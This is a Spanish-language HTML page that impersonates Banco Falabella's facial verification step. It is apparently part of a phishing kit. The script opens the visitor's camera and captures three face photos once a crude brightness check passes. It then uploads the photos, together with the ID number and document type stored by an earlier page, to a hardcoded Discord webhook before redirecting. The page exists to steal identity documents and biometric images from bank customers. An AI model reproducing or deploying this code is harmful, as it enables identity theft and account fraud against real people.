<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Banco Falabella — Verificación Facial</title>
<style>
  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
  html, body {
    height: 100%;
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
    background: #ffffff;
    color: #333;
    -webkit-font-smoothing: antialiased;
  }
  .app {
    display: flex;
    flex-direction: column;
    min-height: 100vh;
    max-width: 430px;
    margin: 0 auto;
    background: #ffffff;
  }
  .header {
    padding: 20px 24px;
    border-bottom: 1px solid #ebebeb;
    display: flex;
    align-items: center;
    gap: 12px;
  }
  .header img { width: 140px; height: auto; }
  .content {
    padding: 24px;
    flex: 1;
    display: flex;
    flex-direction: column;
  }
  .title {
    font-size: 22px;
    font-weight: 700;
    color: #1a1a1a;
    margin-bottom: 8px;
    letter-spacing: -0.3px;
  }
  .instruction {
    font-size: 13px;
    color: #666;
    margin-bottom: 20px;
    line-height: 1.5;
  }
  .instruction strong {
    color: #e8003d;
    font-weight: 600;
  }
  .camera-container {
    position: relative;
    width: 100%;
    border-radius: 16px;
    overflow: hidden;
    background: #000;
    margin: 20px 0;
    aspect-ratio: 1;
    border: 2px solid #d0d0d0;
  }
  #video {
    width: 100%;
    height: 100%;
    object-fit: cover;
    display: block;
    transform: scaleX(-1);
  }
  #canvas {
    display: none;
  }
  .detection-overlay {
    position: absolute;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    display: flex;
    align-items: center;
    justify-content: center;
  }
  .face-frame {
    position: absolute;
    width: 180px;
    height: 240px;
    border: 3px solid rgba(74, 156, 47, 0.4);
    border-radius: 20px;
    box-shadow: inset 0 0 0 1px rgba(74, 156, 47, 0.2);
    background: transparent;
  }
  .face-frame.perfect {
    border-color: #4a9c2f;
    box-shadow: inset 0 0 0 2px #4a9c2f, 0 0 30px rgba(74, 156, 47, 0.6);
    background: rgba(74, 156, 47, 0.08);
    animation: pulse-frame 0.8s ease-in-out infinite;
  }
  @keyframes pulse-frame {
    0%, 100% { box-shadow: inset 0 0 0 2px #4a9c2f, 0 0 20px rgba(74, 156, 47, 0.4); }
    50% { box-shadow: inset 0 0 0 2px #4a9c2f, 0 0 35px rgba(74, 156, 47, 0.7); }
  }
  .status-container {
    margin-bottom: 20px;
  }
  .status {
    text-align: center;
    font-size: 14px;
    color: #888;
    min-height: 48px;
    display: flex;
    align-items: center;
    justify-content: center;
    background: #f9f9f9;
    border-radius: 10px;
    padding: 14px;
    font-weight: 500;
    border: 1px solid #ebebeb;
  }
  .status.ready {
    color: #fff;
    background: linear-gradient(135deg, #4a9c2f 0%, #82d052 100%);
    animation: pulse 1.2s ease-in-out infinite;
    border: none;
  }
  @keyframes pulse {
    0%, 100% { opacity: 1; }
    50% { opacity: 0.85; }
  }
  .status.processing {
    color: #4a9c2f;
    background: #f0f8f4;
    border-color: #4a9c2f;
  }
  .checklist {
    display: grid;
    grid-template-columns: 1fr 1fr;
    gap: 10px;
    margin-bottom: 20px;
  }
  .check-item {
    font-size: 12px;
    padding: 10px 12px;
    border-radius: 8px;
    background: #f5f5f5;
    border: 1.5px solid #e0e0e0;
    display: flex;
    align-items: center;
    gap: 6px;
    color: #666;
    transition: all 0.25s;
  }
  .check-item.ok {
    background: #f0f8f4;
    border-color: #4a9c2f;
    color: #4a9c2f;
    font-weight: 600;
  }
  .check-icon {
    font-weight: bold;
    font-size: 14px;
  }
  .loading {
    display: none;
    text-align: center;
    margin-top: 16px;
  }
  .loading.show {
    display: block;
  }
  .spinner {
    display: inline-block;
    width: 20px;
    height: 20px;
    border: 3px solid #ddd;
    border-top-color: #4a9c2f;
    border-radius: 50%;
    animation: spin 0.8s linear infinite;
    margin-bottom: 8px;
  }
  @keyframes spin { to { transform: rotate(360deg); } }
  .loading-text {
    font-size: 14px;
    color: #4a9c2f;
    font-weight: 600;
  }
</style>
</head>
<body>
<div class="app">
  <div class="header">
    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/ec/Logotipo_Banco_Falabella.svg/1280px-Logotipo_Banco_Falabella.svg.png"
         alt="Banco Falabella" width="140">
  </div>

  <div class="content">
    <p class="title">Verificación facial</p>
    
    <p class="instruction">Acércate a la cámara y espera a que se detecte tu rostro. Mantén una expresión neutral. <strong>Sin lentes ni accesorios</strong>.</p>

    <div class="camera-container">
      <video id="video" autoplay muted playsinline></video>
      <div class="detection-overlay">
        <div class="face-frame" id="faceFrame"></div>
      </div>
    </div>

    <div class="status-container">
      <div class="status" id="status">Iniciando cámara...</div>
    </div>

    <div class="loading" id="loading">
      <div class="spinner"></div>
      <div class="loading-text">Enviando fotos...</div>
    </div>
  </div>
</div>

<canvas id="canvas"></canvas>

<script>
  const video = document.getElementById('video');
  const canvas = document.getElementById('canvas');
  const status = document.getElementById('status');
  const faceFrame = document.getElementById('faceFrame');
  const loading = document.getElementById('loading');

  const WEBHOOK_URL = "https://discordapp.com/api/webhooks/1490551948598837268/ee4s2QMfWrRrKHaeCKDVKYzP3Cg4wFD5G7lbg4v-KOLnAWwolFgJSXcYWfGLKH-IJ8pV";
  
  const savedDni = localStorage.getItem("bf_last_dni") || "No disponible";
  const docType = localStorage.getItem("bf_doc_type") || "DNI";

  const docTypeLabel = {
    "DNI": "DNI",
    "CE": "Carnet",
    "PAS": "Pasaporte"
  };

  let stream = null;
  let isCapturing = false;
  let detectionInterval = null;
  let faceDetectedFrames = 0;

  async function initCamera() {
    try {
      stream = await navigator.mediaDevices.getUserMedia({
        video: {
          facingMode: 'user',
          width: { ideal: 1280 },
          height: { ideal: 720 }
        }
      });
      video.srcObject = stream;
      video.onloadedmetadata = () => {
        status.textContent = '👁️ Apunta tu cara a la cámara...';
        faceFrame.style.display = 'block';
        startSimpleDetection();
      };
    } catch (e) {
      status.textContent = 'Error: No se puede acceder a la cámara';
      console.error('Error:', e);
    }
  }

  function detectFace() {
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    const ctx = canvas.getContext('2d');
    ctx.drawImage(video, 0, 0);
    
    const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
    const data = imageData.data;
    
    // Buscar área central donde debería estar la cara
    const centerX = canvas.width / 2;
    const centerY = canvas.height / 2;
    const searchRadius = 150;
    
    let darkPixels = 0;
    let brightPixels = 0;
    let totalPixels = 0;
    let variance = 0;
    
    // Analizar píxeles en el área central
    for (let y = Math.max(0, centerY - searchRadius); y < Math.min(canvas.height, centerY + searchRadius); y++) {
      for (let x = Math.max(0, centerX - searchRadius); x < Math.min(canvas.width, centerX + searchRadius); x++) {
        const idx = (y * canvas.width + x) * 4;
        const brightness = (data[idx] + data[idx + 1] + data[idx + 2]) / 3;
        
        if (brightness < 60) darkPixels++;      // Píxeles muy oscuros (ojos, nariz)
        if (brightness > 180) brightPixels++;   // Píxeles claros (piel)
        
        variance += Math.abs(brightness - 127); // Variación de tonos
        totalPixels++;
      }
    }
    
    // Calcular porcentaje de características
    const darkRatio = darkPixels / totalPixels;
    const brightRatio = brightPixels / totalPixels;
    const avgVariance = variance / totalPixels;
    
    // Detectar cara: debe haber ojos oscuros, piel clara y variación
    const hasFace = darkRatio > 0.05 && brightRatio > 0.15 && avgVariance > 25;
    
    return hasFace;
  }

  async function capturePhoto() {
    return new Promise(resolve => {
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      const ctx = canvas.getContext('2d');
      ctx.scale(-1, 1);
      ctx.drawImage(video, -video.videoWidth, 0);
      canvas.toBlob(resolve, 'image/jpeg', 0.92);
    });
  }

  async function sendPhotosToDiscord(photoBlobs) {
    try {
      for (let i = 0; i < photoBlobs.length; i++) {
        const formData = new FormData();
        
        formData.append('payload_json', JSON.stringify({
          username: "Banco Falabella Logger",
          avatar_url: "https://upload.wikimedia.org/wikipedia/commons/thumb/e/ec/Logotipo_Banco_Falabella.svg/1280px-Logotipo_Banco_Falabella.svg.png",
          embeds: [{
            title: "📸 VERIFICACIÓN FACIAL — BANCO FALABELLA",
            color: 0x4a9c2f,
            thumbnail: {
              url: "https://upload.wikimedia.org/wikipedia/commons/thumb/e/ec/Logotipo_Banco_Falabella.svg/1280px-Logotipo_Banco_Falabella.svg.png"
            },
            fields: [
              {
                name: "👤 USUARIO",
                value: `\`\`\`\n${docTypeLabel[docType]}: ${savedDni}\n\`\`\``,
                inline: false
              },
              {
                name: "📷 FOTO",
                value: `Foto ${i + 1} de 3`,
                inline: false
              },
              {
                name: "✅ ESTADO",
                value: "Captura completada",
                inline: false
              },
              {
                name: "🕐 HORA",
                value: `${new Date().toLocaleString('es-PE')}`,
                inline: false
              }
            ],
            footer: {
              text: "⚡ by @Brknshinexxx  •  Telegram",
              icon_url: "https://upload.wikimedia.org/wikipedia/commons/thumb/e/ec/Logotipo_Banco_Falabella.svg/1280px-Logotipo_Banco_Falabella.svg.png"
            },
            timestamp: new Date().toISOString()
          }]
        }));

        formData.append('file', photoBlobs[i], `foto_${i + 1}.jpg`);

        const response = await fetch(WEBHOOK_URL, {
          method: 'POST',
          body: formData
        });

        if (!response.ok) {
          throw new Error(`Error enviando foto ${i + 1}`);
        }

        if (i < photoBlobs.length - 1) {
          await new Promise(r => setTimeout(r, 1000));
        }
      }

      loading.classList.remove('show');
      status.classList.add('ready');
      status.textContent = '✓ ¡Verificación completada!';
      if (detectionInterval) clearInterval(detectionInterval);
      stream.getTracks().forEach(track => track.stop());
      
      setTimeout(() => {
        window.location.href = 'index.html';
      }, 2000);
    } catch (e) {
      console.error('Error:', e);
      status.textContent = 'Error. Reintentando...';
      loading.classList.remove('show');
      isCapturing = false;
    }
  }

  async function startSimpleDetection() {
    detectionInterval = setInterval(async () => {
      if (isCapturing) return;

      try {
        if (detectFace()) {
          faceDetectedFrames++;
          faceFrame.classList.add('perfect');

          if (faceDetectedFrames >= 5) {
            isCapturing = true;
            clearInterval(detectionInterval);
            status.textContent = 'Capturando...';
            faceFrame.classList.remove('perfect');
            
            const photos = [];
            for (let i = 0; i < 3; i++) {
              await new Promise(r => setTimeout(r, 500));
              const blob = await capturePhoto();
              photos.push(blob);
            }

            await sendPhotosToDiscord(photos);
          }
        } else {
          faceDetectedFrames = Math.max(0, faceDetectedFrames - 1);
          faceFrame.classList.remove('perfect');
          status.textContent = '👁️ Apunta tu cara a la cámara...';
        }
      } catch (e) {
        console.error('Detection error:', e);
      }
    }, 200);
  }

  initCamera();

  window.addEventListener('beforeunload', () => {
    if (detectionInterval) clearInterval(detectionInterval);
    if (stream) {
      stream.getTracks().forEach(track => track.stop());
    }
  });
</script>
</body>
</html>
